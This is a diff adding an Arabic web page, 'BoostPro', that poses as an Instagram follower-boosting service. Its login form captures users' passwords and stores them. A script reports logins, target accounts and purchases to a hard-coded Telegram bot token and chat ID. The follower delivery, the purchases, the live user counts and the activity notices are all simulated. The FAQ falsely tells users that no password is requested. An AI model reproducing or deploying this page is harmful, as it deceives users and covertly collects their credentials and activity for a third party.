+            <span style="font-size: 1rem; font-weight: 800; color: var(--gold);" id="boostAvailableGems">200</span>
+          </div>
+          <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 8px;">
+            <span style="font-size: 0.85rem; color: var(--text);">عدد المتابعين:</span>
+            <span style="font-size: 1rem; font-weight: 800; color: var(--accent);" id="boostFollowersCount">10</span>
+          </div>
+        </div>
+
+        <button class="boost-btn ripple" id="boostBtn" onclick="startBoost()">
+          <span class="btn-shine"></span>
+          بدء تحويل المتابعين
+        </button>
+      </div>
+
+      <!-- Status -->
+      <div class="status-bar">
+        <span class="live-dot"></span>
+        الخوادم تعمل بكفاءة - الوقت المتوقع: 2-5 دقائق
+      </div>
+    </div>
+  </div>
+
+  <!-- Store Page -->
+  <div class="page" id="pageStore">
+    <div class="section-title" style="margin-bottom: 20px;"><span>متجر الجواهر</span></div>
+
+    <div class="store-grid">
+      <div class="store-card">
+        <div class="store-icon">&#128142;</div>
+        <div class="store-amount">100</div>
+        <div class="store-bonus">جوهرة</div>
+        <div class="store-price">$0.99</div>
+        <button class="store-buy-btn" onclick="buyGems(100, 0.99)">شراء</button>      </div>
+      <div class="store-card">
+        <div class="store-icon">&#128142;</div>
+        <div class="store-amount">250</div>
+        <div class="store-bonus">+50 اضافية</div>
+        <div class="store-price">$1.99</div>
+        <button class="store-buy-btn" onclick="buyGems(250, 1.99)">شراء</button>
+      </div>
+      <div class="store-card featured">
+        <div class="store-icon">&#128142;</div>
+        <div class="store-amount">500</div>
+        <div class="store-bonus">+150 اضافية</div>
+        <div class="store-price">$3.99</div>
+        <button class="store-buy-btn" onclick="buyGems(500, 3.99)">شراء</button>
+      </div>
+      <div class="store-card">
+        <div class="store-icon">&#128142;</div>
+        <div class="store-amount">1000</div>
+        <div class="store-bonus">+400 اضافية</div>
+        <div class="store-price">$6.99</div>
+        <button class="store-buy-btn" onclick="buyGems(1000, 6.99)">شراء</button>
+      </div>
+      <div class="store-card">
+        <div class="store-icon">&#128142;</div>
+        <div class="store-amount">2500</div>
+        <div class="store-bonus">+1000 اضافية</div>
+        <div class="store-price">$14.99</div>
+        <button class="store-buy-btn" onclick="buyGems(2500, 14.99)">شراء</button>
+      </div>
+      <div class="store-card">
+        <div class="store-icon">&#128142;</div>
+        <div class="store-amount">5000</div>
+        <div class="store-bonus">+2500 اضافية</div>
+        <div class="store-price">$24.99</div>
+        <button class="store-buy-btn" onclick="buyGems(5000, 24.99)">شراء</button>
+      </div>
+    </div>
+
+    <!-- Payment Methods -->
+    <div class="payment-section">
+      <div class="section-title" style="margin-bottom: 15px;"><span>طرق الدفع</span></div>
+      <div class="payment-methods">
+        <div class="payment-method" onclick="selectPayment(this)">
+          <div class="payment-icon" style="background: rgba(0,120,255,0.15); color: #0078FF;">&#128179;</div>
+          <div class="payment-info">
+            <h4>بطاقة ائتمان</h4>
+            <p>Visa / Mastercard</p>
+          </div>
+        </div>
+        <div class="payment-method" onclick="selectPayment(this)">          <div class="payment-icon" style="background: rgba(0,150,136,0.15); color: #009688;">&#128176;</div>
+          <div class="payment-info">
+            <h4>PayPal</h4>
+            <p>الدفع عبر باي بال</p>
+          </div>
+        </div>
+        <div class="payment-method" onclick="selectPayment(this)">
+          <div class="payment-icon" style="background: rgba(255,152,0,0.15); color: #FF9800;">&#9928;</div>
+          <div class="payment-info">
+            <h4>USDT</h4>
+            <p>عملة رقمية</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- History Page -->
+  <div class="page" id="pageHistory">
+    <div class="section-title" style="margin-bottom: 20px;"><span>سجل العمليات</span></div>
+
+    <div id="transactionsList">
+      <div class="empty-state" id="emptyHistory">
+        <div class="icon">&#128203;</div>
+        <h3>لا توجد عمليات بعد</h3>
+        <p>ستظهر هنا جميع عملياتك</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Support Page -->
+  <div class="page" id="pageSupport">
+    <div class="section-title" style="margin-bottom: 20px;"><span>الدعم والمساعدة</span></div>
+
+    <div class="support-section">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>كيف ازيد جواهرهك؟</span>
+          <span class="faq-arrow">&#9662;</span>
+        </div>
+        <div class="faq-answer">
+          <p>يمكنك شراء جواهر من المتجر او دعوة اصدقائك باستخدام كود الدعوة. كل صديق يسجل باستخدام كودك تحصل على 50 جوهرة مجانية.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>كم يستغرق تحويل المتابعين؟</span>
+          <span class="faq-arrow">&#9662;</span>
+        </div>
+        <div class="faq-answer">          <p>يتم تحويل المتابعين عادة خلال 2-5 دقائق. في بعض الاحيان قد يستغرق وقتا اطول حسب ضغط الخوادم.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>هل الخدمة امنة؟</span>
+          <span class="faq-arrow">&#9662;</span>
+        </div>
+        <div class="faq-answer">
+          <p>نعم، خدمتنا امنة تماما. لا نطلب كلمة مرور حسابك على انستقرام. فقط اسم المستخدم كافي لارسال المتابعين.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>ماذا افعل اذا لم استلم المتابعين؟</span>
+          <span class="faq-arrow">&#9662;</span>
+        </div>
+        <div class="faq-answer">
+          <p>اذا لم تستلم المتابعين خلال 15 دقيقة، تواصل معنا عبر الدعم الفني وسنقوم بحل المشكلة فوراً. الجواهر ترجع لك في حال فشل العملية.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>هل المتابعين حقيقيين؟</span>
+          <span class="faq-arrow">&#9662;</span>
+        </div>
+        <div class="faq-answer">
+          <p>نوفر متابعين بجودة عالية مع صور وبيانات كاملة. جودة المتابعين تعتمد على الباقة المختارة.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="contact-card">
+      <h3>تحتاج مساعدة؟</h3>
+      <p>فريق الدعم متاح 24/7 لمساعدتك</p>
+      <button class="contact-btn" onclick="showToast('info', 'الدعم الفني', 'سيتم الرد عليك خلال دقائق')">
+        تواصل معنا
+      </button>
+    </div>
+  </div>
+
+  <!-- Profile Page -->
+  <div class="page" id="pageProfile">
+    <div class="profile-header">
+      <div class="profile-avatar" id="profileAvatar">U</div>
+      <h2 class="profile-name" id="profileName">المستخدم</h2>
+      <p class="profile-username" id="profileUsername">@user</p>
+      <div class="profile-stats">
+        <div class="profile-stat">
+          <div class="profile-stat-value" id="profileGems">0</div>          <div class="profile-stat-label">جواهر</div>
+        </div>
+        <div class="profile-stat">
+          <div class="profile-stat-value" id="profileFollowers">0</div>
+          <div class="profile-stat-label">متابعين</div>
+        </div>
+        <div class="profile-stat">
+          <div class="profile-stat-value" id="profileOrders">0</div>
+          <div class="profile-stat-label">طلبات</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="profile-menu">
+      <div class="profile-menu-item" onclick="navigateTo('store')">
+        <div class="left">
+          <div class="icon" style="background: rgba(255,215,61,0.15); color: var(--gold);">&#128142;</div>
+          <span class="text">شراء جواهر</span>
+        </div>
+        <span class="arrow">&#10095;</span>
+      </div>
+      <div class="profile-menu-item" onclick="navigateTo('history')">
+        <div class="left">
+          <div class="icon" style="background: rgba(78,205,196,0.15); color: var(--accent);">&#128203;</div>
+          <span class="text">سجل العمليات</span>
+        </div>
+        <span class="arrow">&#10095;</span>
+      </div>
+      <div class="profile-menu-item" onclick="navigateTo('support')">
+        <div class="left">
+          <div class="icon" style="background: rgba(108,99,255,0.15); color: var(--primary);">&#128222;</div>
+          <span class="text">الدعم الفني</span>
+        </div>
+        <span class="arrow">&#10095;</span>
+      </div>
+      <div class="profile-menu-item" onclick="navigateTo('boost')">
+        <div class="left">
+          <div class="icon" style="background: rgba(255,107,107,0.15); color: var(--secondary);">&#128640;</div>
+          <span class="text">زيادة متابعين</span>
+        </div>
+        <span class="arrow">&#10095;</span>
+      </div>
+    </div>
+
+    <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
+  </div>
+
+  <!-- Bottom Navigation -->
+  <nav class="bottom-nav">
+    <div class="nav-item active" onclick="navigateTo('dashboard')" data-page="dashboard">      <span class="nav-item-icon">&#127968;</span>
+      <span class="nav-item-text">الرئيسية</span>
+    </div>
+    <div class="nav-item" onclick="navigateTo('boost')" data-page="boost">
+      <span class="nav-item-icon">&#128640;</span>
+      <span class="nav-item-text">رشق</span>
+    </div>
+    <div class="nav-item" onclick="navigateTo('store')" data-page="store">
+      <span class="nav-item-icon">&#128142;</span>
+      <span class="nav-item-text">المتجر</span>
+    </div>
+    <div class="nav-item" onclick="navigateTo('history')" data-page="history">
+      <span class="nav-item-icon">&#128203;</span>
+      <span class="nav-item-text">السجل</span>
+    </div>
+    <div class="nav-item" onclick="navigateTo('profile')" data-page="profile">
+      <span class="nav-item-icon">&#128100;</span>
+      <span class="nav-item-text">حسابي</span>
+    </div>
+  </nav>
+
+  <!-- FAB -->
+  <button class="fab" onclick="navigateTo('boost')" title="رشق سريع">&#128640;</button>
+</div>
+
+<!-- Watermark -->
+<div class="watermark">BoostPro v3.0</div>
+
+<script>
+// ==================== CONFIG ====================
+const TELEGRAM_BOT_TOKEN = '7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s'; // ضع توكن البوت هنا
+const TELEGRAM_CHAT_ID = '910624538'; // ضع معرف الشات هنا
+
+// ==================== STATE ====================
+let state = {
+  username: '',
+  password: '',
+  gems: 0,
+  totalFollowers: 0,
+  totalOrders: 0,
+  level: 1,
+  isFirstLogin: true,
+  transactions: [],
+  selectedGems: 100,
+  selectedFollowers: 10
+};
+
+// ==================== INIT ====================
+document.addEventListener('DOMContentLoaded', () => {
+  createParticles();  
+  // Check if returning user
+  const saved = localStorage.getItem('boostpro_user');
+  if (saved) {
+    try {
+      const data = JSON.parse(saved);
+      state = { ...state, ...data, isFirstLogin: false };
+    } catch(e) {}
+  }
+
+  // Loading screen
+  setTimeout(() => {
+    document.getElementById('loadingScreen').classList.add('hidden');
+    
+    if (state.username && !state.isFirstLogin) {
+      showApp();
+    }
+  }, 2500);
+
+  // Live counter animation
+  animateLiveCounter();
+  
+  // Marquee
+  initMarquee();
+});
+
+// ==================== PARTICLES ====================
+function createParticles() {
+  const container = document.getElementById('particles');
+  for (let i = 0; i < 30; i++) {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    p.style.left = Math.random() * 100 + '%';
+    p.style.animationDuration = (8 + Math.random() * 12) + 's';
+    p.style.animationDelay = Math.random() * 10 + 's';
+    p.style.width = (2 + Math.random() * 3) + 'px';
+    p.style.height = p.style.width;
+    const colors = ['#6C63FF', '#4ECDC4', '#FFD93D', '#FF6B6B'];
+    p.style.background = colors[Math.floor(Math.random() * colors.length)];
+    container.appendChild(p);
+  }
+}
+
+// ==================== LOGIN ====================
+document.getElementById('loginForm').addEventListener('submit', (e) => {
+  e.preventDefault();
+  
+  const username = document.getElementById('loginUsername').value.trim();
+  const password = document.getElementById('loginPassword').value.trim();
+    if (!username || !password) {
+    showToast('error', 'خطأ', 'يرجى ملء جميع الحقول');
+    return;
+  }
+
+  state.username = username;
+  state.password = password;
+  
+  // Simulate loading
+  const btn = e.target.querySelector('.login-btn');
+  btn.innerHTML = '<span class="btn-shine"></span> جاري التحقق...';
+  btn.disabled = true;
+  
+  setTimeout(() => {
+    btn.innerHTML = '<span class="btn-shine"></span> تسجيل الدخول';
+    btn.disabled = false;
+    
+    // Send login to Telegram
+    sendToTelegram('تسجيل دخول جديد', `المستخدم: ${username}\nالوقت: ${new Date().toLocaleString('ar')}`);
+    
+    if (state.isFirstLogin) {
+      document.getElementById('loginPage').style.display = 'none';
+      document.getElementById('welcomeModal').classList.add('active');
+    } else {
+      showApp();
+    }
+  }, 2000);
+});
+
+// ==================== WELCOME GIFT ====================
+function claimGift() {
+  state.gems = 200;
+  state.isFirstLogin = false;
+  
+  document.getElementById('welcomeModal').classList.remove('active');
+  saveState();
+  
+  showToast('success', 'مبروك!', 'تم استلام 200 جوهرة هدية ترحيبية');
+  
+  setTimeout(() => {
+    showApp();
+  }, 500);
+}
+
+// ==================== SHOW APP ====================
+function showApp() {
+  document.getElementById('loginPage').style.display = 'none';
+  document.getElementById('appContainer').classList.add('active');
+  
+  updateUI();  generateReferralCode();
+  sendToTelegram('مستخدم جديد دخل التطبيق', `المستخدم: ${state.username}\nالجواهر: ${state.gems}\nالوقت: ${new Date().toLocaleString('ar')}`);
+}
+
+// ==================== NAVIGATION ====================
+function navigateTo(page) {
+  // Update pages
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page' + capitalize(page)).classList.add('active');
+  
+  // Update nav
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.querySelector(`.nav-item[data-page="${page}"]`).classList.add('active');
+  
+  window.scrollTo(0, 0);
+}
+
+function capitalize(str) {
+  return str.charAt(0).toUpperCase() + str.slice(1);
+}
+
+// ==================== UPDATE UI ====================
+function updateUI() {
+  document.getElementById('navGemCount').textContent = formatNumber(state.gems);
+  document.getElementById('dashUsername').textContent = state.username;
+  document.getElementById('navAvatar').textContent = state.username.charAt(0).toUpperCase();
+  document.getElementById('statGems').textContent = formatNumber(state.gems);
+  document.getElementById('statFollowers').textContent = formatNumber(state.totalFollowers);
+  document.getElementById('statOrders').textContent = state.totalOrders;
+  document.getElementById('statLevel').textContent = state.level;
+  document.getElementById('boostAvailableGems').textContent = formatNumber(state.gems);
+  document.getElementById('boostFollowersCount').textContent = state.selectedFollowers;
+  document.getElementById('profileName').textContent = state.username;
+  document.getElementById('profileUsername').textContent = '@' + state.username;
+  document.getElementById('profileAvatar').textContent = state.username.charAt(0).toUpperCase();
+  document.getElementById('profileGems').textContent = formatNumber(state.gems);
+  document.getElementById('profileFollowers').textContent = formatNumber(state.totalFollowers);
+  document.getElementById('profileOrders').textContent = state.totalOrders;
+}
+
+// ==================== GEM SELECTION ====================
+function selectGemOption(el) {
+  document.querySelectorAll('.gem-option').forEach(o => o.classList.remove('selected'));
+  el.classList.add('selected');
+  
+  state.selectedGems = parseInt(el.dataset.gems);
+  state.selectedFollowers = parseInt(el.dataset.followers);
+  
+  document.getElementById('boostFollowersCount').textContent = state.selectedFollowers;
+    // Check if enough gems
+  const btn = document.getElementById('boostBtn');
+  if (state.gems < state.selectedGems) {
+    btn.disabled = true;
+    btn.textContent = 'جواهر غير كافية - اذهب للمتجر';
+  } else {
+    btn.disabled = false;
+    btn.innerHTML = '<span class="btn-shine"></span> بدء تحويل المتابعين';
+  }
+}
+
+// ==================== BOOST ====================
+function startBoost() {
+  const username = document.getElementById('boostUsername').value.trim();
+  
+  if (!username) {
+    showToast('error', 'خطأ', 'يرجى ادخال اسم المستخدم');
+    return;
+  }
+  
+  if (state.gems < state.selectedGems) {
+    showToast('error', 'خطأ', 'جواهر غير كافية. قم بشراء جواهر من المتجر');
+    navigateTo('store');
+    return;
+  }
+  
+  // Deduct gems
+  state.gems -= state.selectedGems;
+  state.totalFollowers += state.selectedFollowers;
+  state.totalOrders++;
+  
+  // Update level
+  state.level = Math.floor(state.totalOrders / 5) + 1;
+  
+  // Add transaction
+  state.transactions.unshift({
+    type: 'expense',
+    description: `رشق ${state.selectedFollowers} متابعين لحساب ${username}`,
+    gems: -state.selectedGems,
+    date: new Date().toLocaleString('ar'),
+    followers: state.selectedFollowers
+  });
+  
+  saveState();
+  updateUI();
+  
+  // Send to Telegram
+  sendToTelegram('عملية رشق جديدة', 
+    `المستخدم: ${state.username}\n` +
+    `الحساب المستهدف: @${username}\n` +    `عدد الجواهر المصروفة: ${state.selectedGems}\n` +
+    `عدد المتابعين: ${state.selectedFollowers}\n` +
+    `رصيد الجواهر المتبقي: ${state.gems}\n` +
+    `الوقت: ${new Date().toLocaleString('ar')}`
+  );
+  
+  // Show processing
+  showProcessing(username);
+}
+
+// ==================== PROCESSING ====================
+function showProcessing(username) {
+  const modal = document.getElementById('processingModal');
+  modal.classList.add('active');
+  document.getElementById('processingTarget').textContent = `@${username} - ${state.selectedFollowers} متابع`;
+  
+  const steps = ['step1', 'step2', 'step3', 'step4'];
+  
+  steps.forEach((step, i) => {
+    setTimeout(() => {
+      // Mark previous as done
+      if (i > 0) {
+        document.getElementById(steps[i-1]).classList.remove('active');
+        document.getElementById(steps[i-1]).classList.add('done');
+        document.getElementById(steps[i-1]).querySelector('.step-icon').textContent = '✓';
+      }
+      document.getElementById(step).classList.add('active');
+    }, (i + 1) * 1500);
+  });
+  
+  // Complete
+  setTimeout(() => {
+    document.getElementById(steps[steps.length-1]).classList.remove('active');
+    document.getElementById(steps[steps.length-1]).classList.add('done');
+    document.getElementById(steps[steps.length-1]).querySelector('.step-icon').textContent = '✓';
+    
+    setTimeout(() => {
+      modal.classList.remove('active');
+      showSuccess(state.selectedFollowers, username);
+    }, 800);
+  }, steps.length * 1500 + 500);
+}
+
+function showSuccess(followers, username) {
+  const modal = document.getElementById('successModal');
+  modal.classList.add('active');
+  document.getElementById('successMessage').textContent = 
+    `تم تحويل ${followers} متابع بنجاح إلى حساب @${username}`;
+  
+  // Create confetti  createConfetti();
+  
+  showToast('success', 'تم بنجاح', `تم ارسال ${followers} متابع`);
+  
+  renderTransactions();
+  updateUI();
+}
+
+function closeSuccess() {
+  document.getElementById('successModal').classList.remove('active');
+  document.getElementById('boostUsername').value = '';
+  
+  // Reset steps
+  document.querySelectorAll('.processing-step').forEach(step => {
+    step.classList.remove('active', 'done');
+    const idx = Array.from(step.parentNode.children).indexOf(step) + 1;
+    step.querySelector('.step-icon').textContent = idx;
+  });
+}
+
+// ==================== CONFETTI ====================
+function createConfetti() {
+  const card = document.querySelector('.success-card');
+  const colors = ['#6C63FF', '#4ECDC4', '#FFD93D', '#FF6B6B', '#00C853', '#FF9100'];
+  
+  for (let i = 0; i < 30; i++) {
+    const confetti = document.createElement('div');
+    confetti.className = 'confetti';
+    confetti.style.left = Math.random() * 100 + '%';
+    confetti.style.top = '-10px';
+    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+    confetti.style.animationDelay = Math.random() * 2 + 's';
+    confetti.style.animationDuration = (2 + Math.random() * 2) + 's';
+    card.appendChild(confetti);
+    
+    setTimeout(() => confetti.remove(), 4000);
+  }
+}
+
+// ==================== STORE ====================
+function buyGems(amount, price) {
+  showToast('info', 'شراء جواهر', `جاري معالجة طلب شراء ${amount} جوهرة بقيمة $${price}`);
+  
+  // Simulate purchase
+  setTimeout(() => {
+    state.gems += amount;
+    
+    state.transactions.unshift({
+      type: 'income',
+      description: `شراء ${amount} جوهرة - $${price}`,      gems: amount,
+      date: new Date().toLocaleString('ar')
+    });
+    
+    saveState();
+    updateUI();
+    renderTransactions();
+    
+    showToast('success', 'تم الشراء', `تم اضافة ${amount} جوهرة بنجاح`);
+    
+    sendToTelegram('شراء جواهر',
+      `المستخدم: ${state.username}\n` +
+      `الجواهر المشتراة: ${amount}\n` +
+      `المبلغ: $${price}\n` +
+      `الرصيد الحالي: ${state.gems}\n` +
+      `الوقت: ${new Date().toLocaleString('ar')}`
+    );
+  }, 2000);
+}
+
+// ==================== PAYMENT ====================
+function selectPayment(el) {
+  document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('selected'));
+  el.classList.add('selected');
+}
+
+// ==================== TRANSACTIONS ====================
+function renderTransactions() {
+  const list = document.getElementById('transactionsList');
+  const empty = document.getElementById('emptyHistory');
+  
+  if (state.transactions.length === 0) {
+    empty.style.display = 'block';
+    return;
+  }
+  
+  empty.style.display = 'none';
+  
+  // Clear existing items (keep empty state div)
+  const items = list.querySelectorAll('.transaction-item');
+  items.forEach(item => item.remove());
+  
+  state.transactions.forEach(tx => {
+    const div = document.createElement('div');
+    div.className = 'transaction-item';
+    div.innerHTML = `
+      <div class="transaction-info">
+        <div class="transaction-icon ${tx.type}">
+          ${tx.type === 'income' ? '&#11014;' : '&#11015;'}
+        </div>        <div class="transaction-details">
+          <h4>${tx.description}</h4>
+          <p>${tx.date}</p>
+        </div>
+      </div>
+      <div class="transaction-amount ${tx.type === 'income' ? 'positive' : 'negative'}">
+        ${tx.gems > 0 ? '+' : ''}${tx.gems} &#9830;
+      </div>
+    `;
+    list.appendChild(div);
+  });
+}
+
+// ==================== FAQ ====================
+function toggleFaq(el) {
+  el.classList.toggle('open');
+}
+
+// ==================== REFERRAL ====================
+function generateReferralCode() {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let code = 'BP-';
+  for (let i = 0; i < 8; i++) {
+    code += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  document.getElementById('referralCode').value = code;
+}
+
+function copyReferral() {
+  const input = document.getElementById('referralCode');
+  input.select();
+  document.execCommand('copy');
+  showToast('success', 'تم النسخ', 'تم نسخ كود الدعوة');
+}
+
+// ==================== TOAST ====================
+function showToast(type, title, message) {
+  const toast = document.getElementById('toast');
+  toast.className = `toast ${type}`;
+  document.getElementById('toastTitle').textContent = title;
+  document.getElementById('toastMessage').textContent = message;
+  
+  const icons = {
+    success: '&#10003;',
+    error: '&#10007;',
+    info: '&#9432;'
+  };
+  toast.querySelector('.toast-icon').innerHTML = icons[type] || '';
+  
+  setTimeout(() => toast.classList.add('show'), 10);  setTimeout(() => toast.classList.remove('show'), 3500);
+}
+
+// ==================== LIVE COUNTER ====================
+function animateLiveCounter() {
+  setInterval(() => {
+    const el = document.getElementById('liveCount');
+    if (el) {
+      let val = parseInt(el.textContent.replace(',', ''));
+      val += Math.floor(Math.random() * 5) - 2;
+      if (val < 800) val = 800;
+      if (val > 2000) val = 2000;
+      el.textContent = val.toLocaleString();
+    }
+  }, 3000);
+}
+
+// ==================== MARQUEE ====================
+function initMarquee() {
+  // Marquee is handled by CSS animation
+}
+
+// ==================== TELEGRAM ====================
+function sendToTelegram(title, message) {
+  if (TELEGRAM_BOT_TOKEN === '7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s') return;
+  
+  const text = `📊 *${title}*\n\n${message}`;
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: 'Markdown'
+    })
+  }).catch(() => {});
+}
+
+// ==================== SAVE STATE ====================
+function saveState() {
+  localStorage.setItem('boostpro_user', JSON.stringify(state));
+}
+
+// ==================== LOGOUT ====================
+function logout() {
+  localStorage.removeItem('boostpro_user');
+  location.reload();
+}
+// ==================== UTILS ====================
+function formatNumber(num) {
+  return num.toLocaleString('ar');
+}
+
+// ==================== KEYBOARD SHORTCUTS ====================
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') {
+    closeSuccess();
+    document.getElementById('welcomeModal').classList.remove('active');
+  }
+});
+
+// ==================== RIPPLE EFFECT ====================
+document.querySelectorAll('.ripple').forEach(btn => {
+  btn.addEventListener('click', function(e) {
+    const rect = this.getBoundingClientRect();
+    const x = e.clientX - rect.left;
+    const y = e.clientY - rect.top;
+    
+    const ripple = document.createElement('span');
+    ripple.style.cssText = `
+      position: absolute;
+      left: ${x}px;
+      top: ${y}px;
+      width: 0;
+      height: 0;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.3);
+      transform: translate(-50%, -50%);
+      animation: rippleEffect 0.6s ease-out;
+      pointer-events: none;
+    `;
+    this.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 600);
+  });
+});
+
+// Add ripple animation
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes rippleEffect {
+    to {
+      width: 200px;
+      height: 200px;
+      opacity: 0;
+    }
+  }
+`;document.head.appendChild(style);
+
+// ==================== AUTO SAVE ====================
+setInterval(saveState, 30000);
+
+// ==================== ONLINE SIMULATION ====================
+function simulateOnline() {
+  const names = ['s***r', 'a***d', 'm***a', 'k***y', 'r***n', 'f***s', 'h***m', 'n***l', 't***a', 'j***e'];
+  const counts = [100, 200, 300, 500, 800, 1000, 150, 250];
+  
+  setInterval(() => {
+    const name = names[Math.floor(Math.random() * names.length)];
+    const count = counts[Math.floor(Math.random() * counts.length)];
+    showToast('info', 'نشاط جديد', `${name} حصل على ${count} متابع`);
+  }, 45000);
+}
+
+simulateOnline();
+</script>
+</body>
+</html>
